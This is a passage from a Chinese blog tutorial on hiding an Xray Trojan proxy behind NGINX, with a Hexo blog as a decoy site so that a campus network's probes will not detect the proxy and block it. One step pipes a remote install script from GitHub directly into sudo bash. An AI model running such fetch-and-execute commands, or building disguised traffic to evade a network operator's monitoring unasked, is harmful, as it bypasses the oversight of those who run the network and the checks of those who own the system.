[::]:<span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> 你的IP;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>之后就能正常看到我们的网站了，这里笔者随便放了一个测试页面：</p><p><img src="https://s2.loli.net/2024/09/12/bLMckeJWH6Bi2CN.png"></p><h2 id="配置-git-hexo-网页伪装（可选）"><a href="#配置-git-hexo-网页伪装（可选）" class="headerlink" title="配置 git + hexo 网页伪装（可选）"></a>配置 git + hexo 网页伪装（可选）</h2><h3 id="1️⃣-安装-hexo"><a href="#1️⃣-安装-hexo" class="headerlink" title="1️⃣ 安装 hexo"></a>1️⃣ 安装 hexo</h3><p>仅有一个空白页面的网站就像一个一碰就碎的纸老虎，校方一旦进行主动探测很容易就会发现这样一个网页并不值得有这么高的访问流量，从而直接封禁域名，因此我们还需要配置一个更加完善的静态网页作为伪装</p><p>比较容易想到的是可以把这个网站配置成一个类似个人博客这样的网站，并在上面放一些有意义的内容，这样即使手工探测也 <em>一时无法发现端倪</em> </p><blockquote><p>当然，这个做法说实话还是有点 <strong>自欺欺人</strong> 的，校园网如果真想封你难道还要挑时间看理由？</p></blockquote><p>首先是配置 hexo，细节笔者就不说了反正不少有自己博客的人大都应该尝试过（包括本站也是使用 hexo 部署的），简而言之只需要：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">注：你得先安装 nodejs，以 openSUSE 为例是 sudo zypper <span class="hljs-keyword">in</span> nodejs-common</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo npm install -g hexo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo init blog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> blog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install hexo-deployer-git --save</span><br></code></pre></td></tr></table></figure><blockquote><p> 如果要在本地查看部署效果，直接 <code>hexo server</code> 即可在 <code>localhost:4000</code> 查看</p></blockquote><h3 id="2️⃣-推送远程"><a href="#2️⃣-推送远程" class="headerlink" title="2️⃣ 推送远程"></a>2️⃣ 推送远程</h3><p>现在我们来看如何部署在远程服务器，这里笔者推荐使用 git 进行部署（ <del>因为看了一圈其他部署方式要么年久失修要么需要额外开端口要么要开启密码验证，不太安全</del> ），首先我们在远程服务器上安装 Git 并配置一个新的 git 用户：</p><blockquote><p>注：其实也可以直接用个人账户，不一定要新建一个 <code>git</code> 用户</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo useradd -m -s /bin/bash -g git git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo passwd git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> ~/.ssh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你的公钥&quot;</span> &gt; ~/.ssh/authorized_keys</span><br></code></pre></td></tr></table></figure><p>创建空白 git 仓库，并添加 hook 执行权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git init --bare ~/blog.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> ~/blog.git/hooks/post-receive</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x ~/blog.git/hooks/post-receive</span><br></code></pre></td></tr></table></figure><p>然后修改 git 仓库目录下的 <code>hooks/post-receive</code> 文件写入如下内容以配置推送上来的文件存放的目录（别忘了给相应文件夹访问权限）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git --work-tree=/srv/www/hexo-blog --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure><p>然后修改 hexo blog 文件夹根目录的 <code>_config.yml</code> ，在末尾添加 git 相关配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">deploy:<br>  type: git<br>  repo: git@你的ssh域名:~/blog.git<br></code></pre></td></tr></table></figure><p>然后运行如下<del>熟悉得不能再熟悉的</del>命令进行推送：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo d -g</span><br></code></pre></td></tr></table></figure><p>最后修改 NGINX 配置里的静态网页目录：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/hexo-blog;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>然后就能正常看到 hexo 博客页面了：</p><p><img src="https://s2.loli.net/2024/09/18/VtjC975S2bqUHgs.png"></p><blockquote><p>更换主题后可能会碰到套 CDN 的地址访问发现样式表炸了的问题，可能是缓存没刷新，稍微等一等就好（几十分钟到几小时？）</p></blockquote><h2 id="配置-XRAY-Trojan-代理"><a href="#配置-XRAY-Trojan-代理" class="headerlink" title="配置 XRAY Trojan 代理"></a>配置 XRAY Trojan 代理</h2><p>总算到了安装真正的代理工具的时候，这里笔者选择 Xray 作为代理软件，代理协议出于安全起见选择 Trojan</p><h3 id="方法1️⃣：使用-Docker-进行部署（推荐）"><a href="#方法1️⃣：使用-Docker-进行部署（推荐）" class="headerlink" title="方法1️⃣：使用 Docker 进行部署（推荐）"></a>方法1️⃣：使用 Docker 进行部署（推荐）</h3><p>安全起见，笔者推荐使用 Docker 部署，这同时也消除了发行版之间的差异性可能导致的部署失败（例如说你可能喜欢在自己的服务器上使用奇奇怪怪的发行版）</p><p>首先编写配置文件 <code>config.json</code> ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;容器内的日志地址，例如/var/log/xray/error.log&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;容器内的日志地址，例如/var/log/xray/access.log&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 你的自定义的xray本地监听端口，例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己想一个密码&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/自己设定的路径&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>然后写 Dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>这两个文件放同一个目录下，运行如下命令创建镜像并启动容器即可，方便起见这里直接使用整个服务器网络，你也可以选择自行配置端口转发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=a3xray --network=host a3xray</span><br></code></pre></td></tr></table></figure><p>使用如下命令配置容器自启动（毕竟有的时候系统更新或许会需要你重启，<del>当然你也可以选择直接买 RedHat 或是 SUSE 的 kernel live patch 服务以避免这个需要</del> ）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker update --restart=always a3xray</span><br></code></pre></td></tr></table></figure><h3 id="方法2️⃣：使用官方安装脚本"><a href="#方法2️⃣：使用官方安装脚本" class="headerlink" title="方法2️⃣：使用官方安装脚本"></a>方法2️⃣：使用官方安装脚本</h3><p>你也可以选择使用官方所给的安装脚本进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ install</span><br></code></pre></td></tr></table></figure><p>接下来随便生成一个 uuid 作为密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xray uuid</span><br></code></pre></td></tr></table></figure><p>接下来编辑配置文件 <code>/usr/local/etc/xray/config.json</code> ，写入如下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/error.log，别忘了给权限&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/access.log，别忘了给权限&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 你的自定义的xray本地监听端口，例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己想一个密码&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/自己设定的路径&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>使用如下命令进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xray -<span class="hljs-built_in">test</span> -config /usr/local/etc/xray/config.json</span><br></code></pre></td></tr></table></figure><p>显示如下结果说明配置文件正常：</p><p><img src="https://s2.loli.net/2024/09/12/EYHDBwvkuoXnOtN.png"></p><p>然后重启 xray：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart xray</span><br></code></pre></td></tr></table></figure><h2 id="配置-NGINX-转发-Xray"><a href="#配置-NGINX-转发-Xray" class="headerlink" title="配置 NGINX 转发 Xray"></a>配置 NGINX 转发 Xray</h2><p>目前有两种主流方案：Xray 前置与 NGINX 前置，前置意味着该节点负责接收所有流量，并分流到相应的服务上，Xray 前置则意味着由 Xray 检测协议，并将非 <code>VLESS/Trojan/...</code> 协议“回落”到 NGINX，NGINX 前置则反过来</p><p>Xray 回落 NGINX 据说已经有能够检测的手段，因此这里我们配置 NGINX 反代 WebSocket 流量转发到后端的代理服务器</p><p>将 NGINX 配置文件中的 443 端口监听修改如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br><br>        <span class="hljs-attribute">ssl_protocols</span>   TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-attribute">ssl_session_cache</span>       shared:SSL:<span class="hljs-number">10m</span>;<br>        <span class="hljs-attribute">ssl_session_timeout</span>     <span class="hljs-number">10m</span>;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/hexo-blog;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br><br>        <span class="hljs-section">location</span> /和xray配置相同的你的自定义路径 &#123;<br>                <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_upgrade</span> != <span class="hljs-string">&quot;websocket&quot;</span>) &#123;<br>                        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>                